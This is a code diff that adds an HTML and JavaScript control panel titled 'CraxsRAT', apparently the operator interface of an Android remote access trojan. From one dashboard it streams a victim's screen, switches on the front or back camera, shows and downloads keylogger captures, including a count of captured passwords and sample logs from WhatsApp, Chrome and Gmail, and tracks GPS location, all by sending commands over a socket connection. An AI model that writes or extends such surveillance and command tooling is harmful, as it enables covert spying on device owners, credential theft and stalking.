@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CraxsRAT - Multi Control Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e1e2e;
+            color: #fff;
+            overflow: hidden;
+        }
+
+        /* Top Bar */
+        .top-bar {
+            background: #2a2a3e;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #3a3a4e;
+        }
+
+        .device-info {
+            display: flex;
+            gap: 20px;
+            font-size: 13px;
+        }
+
+        .device-info span {
+            color: #888;
+        }
+
+        .device-info strong {
+            color: #4a9eff;
+        }
+
+        /* Main Layout */
+        .main-layout {
+            display: flex;
+            height: calc(100vh - 50px);
+        }
+
+        /* Left Sidebar */
+        .sidebar {
+            width: 60px;
+            background: #252535;
+            border-right: 1px solid #3a3a4e;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+            gap: 15px;
+        }
+
+        .sidebar-icon {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+
+        .sidebar-icon:hover {
+            background: #3a3a4e;
+        }
+
+        .sidebar-icon.active {
+            background: #4a9eff;
+        }
+
+        /* Content Area */
+        .content-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Tab Bar */
+        .tab-bar {
+            background: #2a2a3e;
+            display: flex;
+            border-bottom: 1px solid #3a3a4e;
+            overflow-x: auto;
+        }
+
+        .tab {
+            padding: 12px 20px;
+            background: #252535;
+            border-right: 1px solid #3a3a4e;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 150px;
+            transition: all 0.3s;
+        }
+
+        .tab:hover {
+            background: #2a2a3e;
+        }
+
+        .tab.active {
+            background: #4a9eff;
+            color: white;
+        }
+
+        .tab-close {
+            margin-left: auto;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        .tab-close:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        /* Multi Panel Container */
+        .multi-panel {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 1fr 1fr;
+            gap: 2px;
+            background: #1e1e2e;
+            overflow: hidden;
+        }
+
+        .multi-panel.single {
+            grid-template-columns: 1fr;
+            grid-template-rows: 1fr;
+        }
+
+        .multi-panel.dual-horizontal {
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 1fr;
+        }
+
+        .multi-panel.dual-vertical {
+            grid-template-columns: 1fr;
+            grid-template-rows: 1fr 1fr;
+        }
+
+        /* Panel */
+        .panel {
+            background: #252535;
+            display: none;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .panel.active {
+            display: flex;
+        }
+
+        .panel-header {
+            background: #2a2a3e;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #3a3a4e;
+        }
+
+        .panel-title {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .panel-controls {
+            display: flex;
+            gap: 8px;
+        }
+
+        .panel-btn {
+            padding: 4px 10px;
+            background: #3a3a4e;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .panel-btn:hover {
+            background: #4a4a5e;
+        }
+
+        .panel-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+        }
+
+        /* Screen View */
+        .screen-view {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1a1a2a;
+        }
+
+        .screen-view img {
+            max-width: 100%;
+            max-height: 100%;
+            border-radius: 8px;
+        }
+
+        .screen-placeholder {
+            text-align: center;
+            color: #666;
+        }
+
+        /* Camera View */
+        .camera-view {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            padding: 10px;
+            background: #2a2a3e;
+            border-radius: 8px;
+        }
+
+        .camera-preview {
+            flex: 1;
+            background: #1a1a2a;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* File Manager */
+        .file-manager {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .file-path {
+            background: #2a2a3e;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .file-list {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .file-item {
+            background: #2a2a3e;
+            padding: 12px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .file-item:hover {
+            background: #3a3a4e;
+        }
+
+        .file-icon {
+            font-size: 20px;
+        }
+
+        .file-info {
+            flex: 1;
+        }
+
+        .file-name {
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .file-size {
+            font-size: 11px;
+            color: #888;
+        }
+
+        /* SMS View */
+        .sms-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .sms-item {
+            background: #2a2a3e;
+            padding: 12px;
+            border-radius: 8px;
+        }
+
+        .sms-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .sms-sender {
+            font-weight: 600;
+            color: #4a9eff;
+        }
+
+        .sms-time {
+            font-size: 11px;
+            color: #888;
+        }
+
+        .sms-body {
+            font-size: 13px;
+            color: #ccc;
+        }
+
+        /* Keylogger */
+        .keylogger-view {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .keylogger-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .stat-box {
+            background: #2a2a3e;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 5px;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #4a9eff;
+        }
+
+        .keylogger-logs {
+            flex: 1;
+            background: #1a1a2a;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 12px;
+            overflow-y: auto;
+        }
+
+        .key-entry {
+            padding: 8px;
+            margin-bottom: 5px;
+            background: #252535;
+            border-radius: 4px;
+            border-left: 3px solid #4a9eff;
+        }
+
+        .key-app {
+            color: #4a9eff;
+            font-weight: 600;
+        }
+
+        .key-time {
+            color: #888;
+            font-size: 10px;
+        }
+
+        .key-text {
+            color: #fff;
+            margin-top: 5px;
+        }
+
+        /* Location Map */
+        .location-view {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .location-info {
+            background: #2a2a3e;
+            padding: 12px;
+            border-radius: 8px;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            font-size: 12px;
+        }
+
+        .map-container {
+            flex: 1;
+            background: #1a1a2a;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 8px 16px;
+            background: #4a9eff;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            background: #3a8eef;
+        }
+
+        .btn-danger {
+            background: #ff4a4a;
+        }
+
+        .btn-danger:hover {
+            background: #ef3a3a;
+        }
+
+        .btn-success {
+            background: #4aff4a;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1e1e2e;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #4a9eff;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #3a8eef;
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="device-info">
+            <span>📱 <strong id="deviceModel">Samsung Galaxy S21</strong></span>
+            <span>🤖 <strong id="androidVersion">Android 12</strong></span>
+            <span>📶 <strong id="wifiStatus">WiFi Connected</strong></span>
+            <span>🔋 <strong id="batteryLevel">85%</strong></span>
+            <span>🟢 <strong id="connectionStatus">Online</strong></span>
+        </div>
+        <div>
+            <button class="btn" onclick="window.location.href='user-dashboard.html'">← Back</button>
+        </div>
+    </div>
+
+    <!-- Main Layout -->
+    <div class="main-layout">
+        <!-- Left Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-icon active" title="Device" onclick="showSidebar('device')">📱</div>
+            <div class="sidebar-icon" title="Chat" onclick="showSidebar('chat')">💬</div>
+            <div class="sidebar-icon" title="Stats" onclick="showSidebar('stats')">📊</div>
+            <div class="sidebar-icon" title="Users" onclick="showSidebar('users')">👥</div>
+            <div class="sidebar-icon" title="Tools" onclick="showSidebar('tools')">🔧</div>
+            <div class="sidebar-icon" title="Cloud" onclick="showSidebar('cloud')">☁️</div>
+            <div class="sidebar-icon" title="Settings" onclick="showSidebar('settings')">⚙️</div>
+        </div>
+
+        <!-- Content Area -->
+        <div class="content-area">
+            <!-- Tab Bar -->
+            <div class="tab-bar" id="tabBar">
+                <!-- Tabs will be added dynamically -->
+            </div>
+
+            <!-- Multi Panel Container -->
+            <div class="multi-panel" id="multiPanel">
+                <!-- Panel 1 -->
+                <div class="panel active" id="panel1">
+                    <div class="panel-header">
+                        <div class="panel-title">📺 Live Screen</div>
+                        <div class="panel-controls">
+                            <button class="panel-btn" onclick="captureScreen(1)">📸 Capture</button>
+                            <button class="panel-btn" onclick="startStream(1)">▶️ Stream</button>
+                            <button class="panel-btn panel-btn-danger" onclick="closePanel(1)">✕</button>
+                        </div>
+                    </div>
+                    <div class="panel-content">
+                        <div class="screen-view" id="screenView1">
+                            <div class="screen-placeholder">
+                                <h3>📺 Live Screen</h3>
+                                <p>Click "Stream" to start live view</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 2 -->
+                <div class="panel active" id="panel2">
+                    <div class="panel-header">
+                        <div class="panel-title">📷 Camera</div>
+                        <div class="panel-controls">
+                            <button class="panel-btn" onclick="switchCamera(2)">🔄 Switch</button>
+                            <button class="panel-btn" onclick="capturePhoto(2)">📸 Photo</button>
+                            <button class="panel-btn panel-btn-danger" onclick="closePanel(2)">✕</button>
+                        </div>
+                    </div>
+                    <div class="panel-content">
+                        <div class="camera-view">
+                            <div class="camera-controls">
+                                <button class="btn" onclick="startCamera('front')">🤳 Front</button>
+                                <button class="btn" onclick="startCamera('back')">📷 Back</button>
+                                <button class="btn btn-danger" onclick="stopCamera()">⏹️ Stop</button>
+                            </div>
+                            <div class="camera-preview" id="cameraPreview">
+                                <div class="screen-placeholder">
+                                    <h3>📷 Camera</h3>
+                                    <p>Select camera to start</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 3 -->
+                <div class="panel active" id="panel3">
+                    <div class="panel-header">
+                        <div class="panel-title">⌨️ Keylogger</div>
+                        <div class="panel-controls">
+                            <button class="panel-btn" onclick="refreshKeylogger()">🔄 Refresh</button>
+                            <button class="panel-btn" onclick="downloadKeylogger()">⬇️ Download</button>
+                            <button class="panel-btn panel-btn-danger" onclick="closePanel(3)">✕</button>
+                        </div>
+                    </div>
+                    <div class="panel-content">
+                        <div class="keylogger-view">
+                            <div class="keylogger-stats">
+                                <div class="stat-box">
+                                    <div class="stat-label">Total Keys</div>
+                                    <div class="stat-value" id="totalKeys">0</div>
+                                </div>
+                                <div class="stat-box">
+                                    <div class="stat-label">Apps Logged</div>
+                                    <div class="stat-value" id="appsLogged">0</div>
+                                </div>
+                                <div class="stat-box">
+                                    <div class="stat-label">Passwords</div>
+                                    <div class="stat-value" id="passwordsCaptured">0</div>
+                                </div>
+                            </div>
+                            <div class="keylogger-logs" id="keyloggerLogs">
+                                <div class="key-entry">
+                                    <div class="key-app">WhatsApp</div>
+                                    <div class="key-time">2024-12-24 18:45:23</div>
+                                    <div class="key-text">Hello, how are you?</div>
+                                </div>
+                                <div class="key-entry">
+                                    <div class="key-app">Chrome</div>
+                                    <div class="key-time">2024-12-24 18:43:15</div>
+                                    <div class="key-text">facebook.com</div>
+                                </div>
+                                <div class="key-entry">
+                                    <div class="key-app">Gmail</div>
+                                    <div class="key-time">2024-12-24 18:40:10</div>
+                                    <div class="key-text">Password: ********</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Panel 4 -->
+                <div class="panel active" id="panel4">
+                    <div class="panel-header">
+                        <div class="panel-title">📍 Location</div>
+                        <div class="panel-controls">
+                            <button class="panel-btn" onclick="refreshLocation()">🔄 Refresh</button>
+                            <button class="panel-btn" onclick="trackLocation()">📍 Track</button>
+                            <button class="panel-btn panel-btn-danger" onclick="closePanel(4)">✕</button>
+                        </div>
+                    </div>
+                    <div class="panel-content">
+                        <div class="location-view">
+                            <div class="location-info">
+                                <div><strong>Latitude:</strong> <span id="latitude">28.7041</span></div>
+                                <div><strong>Longitude:</strong> <span id="longitude">77.1025</span></div>
+                                <div><strong>Accuracy:</strong> <span id="accuracy">10m</span></div>
+                                <div><strong>Updated:</strong> <span id="locationTime">Just now</span></div>
+                            </div>
+                            <div class="map-container" id="mapContainer">
+                                <div>🗺️ Map will load here</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        const deviceId = localStorage.getItem('selectedDevice');
+        const user = JSON.parse(localStorage.getItem('user') || '{}');
+        
+        if (!deviceId || !user.email) {
+            window.location.href = 'user-dashboard.html';
+        }
+
+        const socket = io('http://localhost:5000');
+
+        // Active panels
+        let activePanels = [1, 2, 3, 4];
+        let panelLayout = 'quad'; // single, dual-horizontal, dual-vertical, quad
+
+        // Initialize
+        socket.emit('user:login', { userId: user.email, email: user.email });
+        socket.emit('device:get_info', { deviceId });
+
+        // Update device info
+        socket.on('device:info', (info) => {
+            document.getElementById('deviceModel').textContent = info.model || 'Unknown';
+            document.getElementById('androidVersion').textContent = info.androidVersion || 'Unknown';
+            document.getElementById('batteryLevel').textContent = (info.battery || 0) + '%';
+        });
+
+        // Stream updates
+        socket.on('stream:update', (data) => {
+            if (data.streamType === 'screen') {
+                document.getElementById('screenView1').innerHTML = `<img src="${data.data}" alt="Screen">`;
+            } else if (data.streamType === 'camera') {
+                document.getElementById('cameraPreview').innerHTML = `<img src="${data.data}" alt="Camera">`;
+            }
+        });
+
+        // Keylogger updates
+        socket.on('keylogger:update', (data) => {
+            const logs = document.getElementById('keyloggerLogs');
+            const entry = document.createElement('div');
+            entry.className = 'key-entry';
+            entry.innerHTML = `
+                <div class="key-app">${data.app}</div>
+                <div class="key-time">${new Date(data.timestamp).toLocaleString()}</div>
+                <div class="key-text">${data.text}</div>
+            `;
+            logs.insertBefore(entry, logs.firstChild);
+            
+            // Update stats
+            document.getElementById('totalKeys').textContent = parseInt(document.getElementById('totalKeys').textContent) + data.text.length;
+        });
+
+        // Functions
+        function captureScreen(panel) {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'capture_screen',
+                commandData: {}
+            });
+        }
+
+        function startStream(panel) {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'start_screen_stream',
+                commandData: {}
+            });
+        }
+
+        function startCamera(type) {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'start_camera',
+                commandData: { camera: type }
+            });
+        }
+
+        function stopCamera() {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'stop_camera',
+                commandData: {}
+            });
+        }
+
+        function refreshKeylogger() {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'get_keylogger_data',
+                commandData: {}
+            });
+        }
+
+        function downloadKeylogger() {
+            const logs = document.getElementById('keyloggerLogs').innerText;
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `keylogger_${deviceId}_${Date.now()}.txt`;
+            a.click();
+        }
+
+        function refreshLocation() {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'get_location',
+                commandData: {}
+            });
+        }
+
+        function trackLocation() {
+            socket.emit('command:send', {
+                deviceId,
+                command: 'start_location_tracking',
+                commandData: {}
+            });
+        }
+
+        function closePanel(panelNum) {
+            document.getElementById(`panel${panelNum}`).classList.remove('active');
+            activePanels = activePanels.filter(p => p !== panelNum);
+            updateLayout();
+        }
+
+        function updateLayout() {
+            const multiPanel = document.getElementById('multiPanel');
+            const count = activePanels.length;
+            
+            if (count === 1) {
+                multiPanel.className = 'multi-panel single';
+            } else if (count === 2) {
+                multiPanel.className = 'multi-panel dual-horizontal';
+            } else if (count === 3 || count === 4) {
+                multiPanel.className = 'multi-panel';
+            }
+        }
+
+        function showSidebar(section) {
+            console.log('Showing sidebar:', section);
+        }
+
+        // Request device info every 5 seconds
+        setInterval(() => {
+            socket.emit('device:get_info', { deviceId });
+        }, 5000);
+    </script>
+</body>
+</html>
